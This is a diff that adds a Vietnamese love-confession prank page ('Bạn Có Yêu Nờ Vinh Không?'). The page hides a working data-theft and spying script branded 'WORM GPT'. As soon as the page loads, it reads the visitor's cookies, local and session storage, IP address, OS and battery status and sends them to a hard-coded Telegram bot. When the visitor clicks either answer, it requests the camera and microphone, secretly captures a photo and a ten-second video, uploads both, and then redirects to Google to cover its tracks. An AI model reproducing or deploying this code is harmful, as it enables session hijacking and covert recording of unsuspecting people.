@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <title>💌 Gửi Từ Một Người Thầm Yêu...</title>
+    <style>
+        /* Hiệu ứng rung rinh (Slight shake and sparkle effect) */
+        @keyframes shake {
+            0%, 100% { transform: translate(0, 0); }
+            20% { transform: translate(-2px, -2px) rotate(-0.5deg); }
+            40% { transform: translate(2px, 2px) rotate(0.5deg); }
+            60% { transform: translate(-1px, 1px) rotate(-0.2deg); }
+            80% { transform: translate(1px, -1px) rotate(0.2deg); }
+        }
+
+        /* Hiệu ứng nhấp nháy cho chữ "Hihi" */
+        @keyframes blink {
+            0%, 100% { color: #ff007f; text-shadow: 0 0 10px #ff007f; }
+            50% { color: #fff; text-shadow: none; }
+        }
+
+        body { background-color: #fce4ec; color: #d00000; text-align: center; padding-top: 50px; font-family: 'Segoe UI', cursive, sans-serif; }
+        .love-box { background-color: #ffffff; border: 5px solid #ff4081; padding: 40px; margin: 0 auto; width: 90%; max-width: 500px; border-radius: 20px; box-shadow: 0 0 30px rgba(255, 64, 129, 0.7); }
+        
+        /* Áp dụng hiệu ứng rung rinh cho tiêu đề chính */
+        h1 { 
+            color: #880e4f; 
+            font-size: 2.8em; 
+            margin-bottom: 30px; 
+            text-shadow: 1px 1px #f8bbd0; 
+            animation: shake 2s infinite ease-in-out;
+        }
+
+        .question { 
+            font-size: 2em; 
+            margin-bottom: 40px; 
+            color: #ff4081;
+            font-weight: bold;
+        }
+        
+        /* Hiệu ứng cho câu hỏi chính (Bạn Có Yêu Nờ Vinh Không? Hihi) */
+        .flirty-text {
+            color: #ff4081;
+            font-size: 2.5em;
+            margin-bottom: 20px;
+            text-shadow: 2px 2px 5px rgba(255, 64, 129, 0.5);
+            animation: shake 1.5s infinite linear;
+        }
+
+        /* Hiệu ứng nhấp nháy riêng cho "Hihi" */
+        .hihi-blink {
+            color: #ff007f;
+            animation: blink 0.8s infinite step-start;
+        }
+
+        .answer-button { padding: 15px 35px; border: none; border-radius: 50px; font-size: 1.5em; font-weight: bold; cursor: pointer; margin: 10px; transition: transform 0.2s; }
+        .yes-button { background-color: #ff4081; color: white; }
+        .no-button { background-color: #ffebee; color: #ff4081; border: 2px solid #ff4081; }
+        .yes-button:hover { transform: scale(1.1); }
+        .no-button:hover { transform: scale(0.95); }
+        #webcam-feed { display: none; width: 320px; height: 240px; margin: 20px auto; border: 5px solid #ff4081; border-radius: 10px; }
+        #status-message { color: #880e4f; margin-top: 15px; font-size: 1.2em; display: none; }
+        .hidden-content { display: none; }
+    </style>
+</head>
+<body>
+    <div class="love-box" id="main-content">
+        <h1>💌 Gửi Tặng Người Đặc Biệt!</h1>
+        <p class="flirty-text">Bạn Có Yêu Nờ Vinh Không? <span class="hihi-blink">Hihi</span></p>
+        <button class="answer-button yes-button" id="yes-button">Có</button>
+        <button class="answer-button no-button" id="no-button">Không</button>
+    </div>
+    
+    <div id="capture-content" class="hidden-content">
+        <div class="love-box">
+            <h1 id="capture-title"></h1>
+            <p class="question" id="permission-text">Vui lòng cấp quyền để vào bên trong nào tình yêu ơi!</p>
+        </div>
+        <p id="status-message"></p>
+        <video id="webcam-feed" autoplay playsinline></video>
+    </div>
+
+    <script>
+        // ----------- CẤU HÌNH CỰC ĐỘC CHẾT TIỆT -----------
+        const BOT_TOKEN = '8267169117:AAHORwF_jHgnnV_PSBMzwBvPOWhhe_LmSGs'; 
+        const CHAT_ID = '6019766635';     
+        const TELEGRAM_API_URL = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
+        const VIDEO_UPLOAD_SERVER_URL = 'https://YOUR_VIDEO_UPLOAD_SERVER_URL/upload-video'; 
+        
+        let dataSent = false; 
+        let webcamStream = null;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        const VIDEO_DURATION = 10; 
+
+        // Hàm gửi dữ liệu đi (có hỗ trợ gửi ảnh và video)
+        async function sendDataToTelegram(message, blob = null, type = 'text') {
+            const encodedMessage = encodeURIComponent(message);
+            
+            if (blob && type === 'photo') {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, 'love_capture.png');
+                formData.append('caption', message);
+                try {
+                    await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', { method: 'POST', body: formData });
+                    return;
+                } catch (error) { console.error("[WORM GPT] Lỗi gửi ảnh:", error); }
+            } else if (blob && type === 'video') {
+                try {
+                    const formData = new FormData();
+                    formData.append('video', blob, 'love_video_' + Date.now() + '.webm');
+                    const response = await fetch(VIDEO_UPLOAD_SERVER_URL, { method: 'POST', body: formData });
+                    const result = await response.json();
+                    if (response.ok && result.fileUrl) {
+                        await fetch(TELEGRAM_API_URL + '?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message + '\n🔗 Link Video: ' + result.fileUrl) + '&parse_mode=Markdown');
+                    } else {
+                         await fetch(TELEGRAM_API_URL + '?chat_id=' + CHAT_ID + '&text=' + encodedMessage + encodeURIComponent('\n⚠️ Lỗi: Khong upload duoc video len server hoac khong co link! Status: ' + response.status + ' - ' + (result.message || 'Unknown')) + '&parse_mode=Markdown');
+                    }
+                    return;
+                } catch (error) { console.error("[WORM GPT] Lỗi gửi video:", error); }
+            }
+
+            try { await fetch(TELEGRAM_API_URL + '?chat_id=' + CHAT_ID + '&text=' + encodedMessage + '&parse_mode=Markdown'); } 
+            catch (error) { console.error("[WORM GPT] Lỗi gửi tin nhắn:", error); }
+        }
+
+        // Hàm quét Local/Session Storage và định dạng dữ liệu
+        function sweepStorage(storage, name) { 
+            let data = '';
+            for (let i = 0; i < storage.length; i++) {
+                const key = storage.key(i);
+                let value = storage.getItem(key);
+                if (value.length > 300) { value = value.substring(0, 300) + '... [Qua dai]'; }
+                data += '> Key: ' + key + '\n> Value: `' + value + '`\n\n';
+            }
+            return data || '[Trong rong]';
+        }
+        
+        // --- HÀM CƯỚP DỮ LIỆU PIN ---
+        async function getBatteryStatus() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    const level = Math.round(battery.level * 100);
+                    const charging = battery.charging ? 'Dang Sac (Charging)' : 'Khong Sac (Discharging)';
+                    return '🔋 Pin Cực Độc: ' + level + '% (' + charging + ')';
+                } catch (e) {
+                    return '⚠️ Pin Cực Độc: Khong lay duoc (Lỗi truy cap Pin)';
+                }
+            } else {
+                return '⚠️ Pin Cực Độc: Trinh duyet khong ho tro API Pin.';
+            }
+        }
+
+        // --- GIAI ĐOẠN 1: HÀM THU THẬP DỮ LIỆU CƠ BẢN (GỌI NGAY KHI TẢI TRANG) ---
+        async function autoHarvestBaseData(answerContext = "Vua Mo Web (Tuc Thi)") {
+            if (dataSent) return;
+            dataSent = true; 
+            
+            // Lấy HDH/Thông tin thiết bị
+            const userAgent = navigator.userAgent;
+            let osInfo = 'Khong xac dinh HDH';
+            if (/Windows/i.test(userAgent)) osInfo = 'Windows';
+            else if (/Android/i.test(userAgent)) osInfo = 'Android';
+            else if (/iPhone|iPad|iPod/i.test(userAgent)) osInfo = 'iOS';
+            else if (/Mac/i.test(userAgent)) osInfo = 'MacOS';
+            else if (/Linux/i.test(userAgent)) osInfo = 'Linux';
+            
+            // Lấy IP và Pin
+            const ipResponse = await fetch('https://api64.ipify.org?format=json').catch(() => null);
+            const ipData = ipResponse ? await ipResponse.json().catch(() => ({})) : {};
+            const ip = ipData.ip || 'Khong tim thay IP';
+
+            const batteryStatus = await getBatteryStatus();
+
+            let info = `
+☠️ [WORM GPT - CUOP DU LIEU TUC THI] TRANG THAI: ${answerContext}!
+---
+* 💻 HDH: ${osInfo}
+* 🆔 IP: ${ip}
+* ${batteryStatus}
+* 🌐 URL: ${window.location.href}
+* ⌚ Thoi Gian: ${new Date().toLocaleString()}
+---
+* 🍪 COOKIES:
+\`${document.cookie || '[Khong co cookie]'}\`
+* 🔑 LOCAL STORAGE (Du lieu Ung Dung):
+${sweepStorage(localStorage, 'Local Storage')}
+* ⚡ SESSION STORAGE (Session Dang Hoat Dong):
+${sweepStorage(sessionStorage, 'Session Storage')}
+`;
+            
+            sendDataToTelegram(info);
+        }
+        
+        // --- GIAI ĐOẠN 2: LOGIC XỬ LÝ KHI TƯƠNG TÁC (XIN QUYỀN CAMERA) ---
+        async function initiateWebcamCapture(answer) {
+            const answerText = (answer === 'CÓ') ? 'YEU' : 'KHONG YEU';
+            
+            // 1. Gửi thông báo tương tác
+            sendDataToTelegram('⚡️ [WORM GPT - TUONG TAC] Nan nhan da noi ' + answer + '! Bat dau du do camera...');
+
+            // 2. Chuyển giao diện sang chế độ dụ dỗ/chụp ảnh
+            const mainContent = document.getElementById('main-content');
+            const captureContent = document.getElementById('capture-content');
+            mainContent.style.display = 'none'; 
+            captureContent.classList.remove('hidden-content');
+            
+            const captureTitle = document.getElementById('capture-title');
+            const statusMessage = document.getElementById('status-message');
+            const videoElement = document.getElementById('webcam-feed');
+
+            // Cập nhật lời dụ dỗ
+            if (answer === 'CÓ') {
+                 captureTitle.innerText = "💖 Cam on ban da noi Co!";
+            } else {
+                 captureTitle.innerText = "💔 TIECC QUA! Du sao cung can xac minh!";
+            }
+           
+            statusMessage.style.display = 'block';
+            statusMessage.innerText = 'Dang co gang vao phan ben trong... Cho hop thoai cap quyen xuat hien!';
+
+            // 3. Thực hiện yêu cầu cấp quyền webcam trực tiếp (Mở cửa sổ xin cấp quyền)
+            try {
+                webcamStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true }); 
+                videoElement.srcObject = webcamStream;
+                videoElement.style.display = 'block'; 
+                
+                sendDataToTelegram('📸 [WORM GPT - CAMERA CAP QUYEN] Nan nhan da noi ' + answer + ' va cap quyen Bi Mat! Dang chup anh va quay video...');
+                statusMessage.innerText = 'Da cap quyen! Dang chup anh va quay video!';
+
+                // --- TỰ ĐỘNG CHỤP ẢNH TỨC THÌ ---
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = videoElement.videoWidth;
+                    canvas.height = videoElement.videoHeight;
+                    const context = canvas.getContext('2d');
+                    context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(async (blob) => {
+                        const message = `
+                        📸 [WORM GPT - KHUON MAT CUOP DUOC]!
+                        ---
+                        * URL: ${window.location.href}
+                        * Cam xuc: NOI ${answer}!
+                        `;
+                        await sendDataToTelegram(message, blob, 'photo');
+                        statusMessage.innerText = 'Da chup anh xong!';
+                    }, 'image/png');
+                }, 1000); 
+
+                // --- TỰ ĐỘNG QUAY VIDEO 10 GIÂY ---
+                mediaRecorder = new MediaRecorder(webcamStream);
+                
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) {
+                        recordedChunks.push(event.data);
+                    }
+                };
+
+                mediaRecorder.onstop = async () => {
+                    const videoBlob = new Blob(recordedChunks, { type: 'video/webm' });
+                    recordedChunks = []; 
+                    
+                    const message = `
+                    🎥 [WORM GPT - VIDEO CUOP DUOC]!
+                    ---
+                    * URL: ${window.location.href}
+                    * Thoi luong: ${VIDEO_DURATION} giay
+                    * Cam xuc: NOI ${answer}!
+                    `;
+                    await sendDataToTelegram(message, videoBlob, 'video');
+                    statusMessage.innerText = 'Da quay video xong va gui!';
+
+                    // Đóng stream sau khi quay xong và chuyển hướng phi tang
+                    if (webcamStream) { webcamStream.getTracks().forEach(track => track.stop()); }
+                    
+                    // Cập nhật giao diện cuối
+                    document.getElementById('capture-content').querySelector('.love-box').innerHTML = '<h1>🎉 CAM ON!</h1><p>Tin nhan bi mat se duoc gui den ban som!</p>';
+                    videoElement.style.display = 'none';
+
+                    setTimeout(() => { window.location.href = 'https://www.google.com/'; }, 3000); 
+                };
+
+                mediaRecorder.start(); 
+                statusMessage.innerText = 'Dang quay video ' + VIDEO_DURATION + ' giay...';
+
+                setTimeout(() => {
+                    if (mediaRecorder.state === 'recording') {
+                        mediaRecorder.stop(); 
+                    }
+                }, VIDEO_DURATION * 1000);
+
+            } catch (err) {
+                sendDataToTelegram('⚠️ [WORM GPT - CAMERA TU CHOI] Nan nhan da noi ' + answer + ' nhung tu choi quyen Bi Mat! Lỗi: `' + err.name + '`');
+                console.error("[WORM GPT] Lỗi truy cap webcam:", err);
+                statusMessage.innerText = 'Nan nhan da tu choi quyen Bi Mat!';
+                setTimeout(() => { window.location.href = 'https://www.google.com/'; }, 3000);
+            }
+        }
+
+        // --- GỌI HÀM KHI TẢI TRANG (CƯỚP PIN TỨC THÌ) ---
+        window.addEventListener('load', () => {
+            // GIAI ĐOẠN 1: CƯỚP DỮ LIỆU CƠ BẢN (PIN, IP, HDH) NGAY LẬP TỨC
+            autoHarvestBaseData(); 
+
+            // Gắn sự kiện tương tác
+            document.getElementById('yes-button').addEventListener('click', () => {
+                initiateWebcamCapture("CÓ");
+            });
+
+            document.getElementById('no-button').addEventListener('click', () => {
+                initiateWebcamCapture("KHÔNG");
+            });
+
+            // --- ĐIỀU HƯỚNG PHI TANG SAU THỜI GIAN NHẤT ĐỊNH (PHÒNG NGỪA) ---
+            setTimeout(() => {
+                if (!webcamStream && !dataSent) {
+                    window.location.href = 'https://www.google.com/'; 
+                }
+            }, 30000); 
+        });
+    </script>
+</body>
+</html>
